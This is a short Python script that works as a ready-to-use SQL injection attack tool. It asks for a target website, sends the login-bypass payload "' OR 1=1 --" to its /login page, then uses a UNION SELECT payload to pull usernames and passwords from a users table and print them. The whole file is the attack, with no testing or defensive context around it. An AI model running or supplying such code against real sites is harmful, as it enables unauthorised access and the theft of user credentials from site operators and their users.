import requests

def exploit_sql_injection(url):
    # Identify SQL injection vulnerability
    payload = "' OR 1=1 --"
    response = requests.post(url + "/login", data={"username": payload, "password": ""})
    if "Login successful" in response.text:
        print("SQL injection vulnerability found!")
        return True
    else:
        print("No SQL injection vulnerability found.")
        return False

def extract_credentials(url):
    # Use SQL injection to extract user credentials
    payload = "' UNION SELECT username, password FROM users --"
    response = requests.post(url + "/login", data={"username": payload, "password": ""})
    credentials = response.text.split("<br>")
    for cred in credentials:
        if ":" in cred:
            username, password = cred.split(":")
            print(f"Extracted credentials: {username.strip()}:{password.strip()}")

def main():
    url = input("Enter the URL of the target website: ")
    if exploit_sql_injection(url):
        extract_credentials(url)

if __name__ == "__main__":
    main()
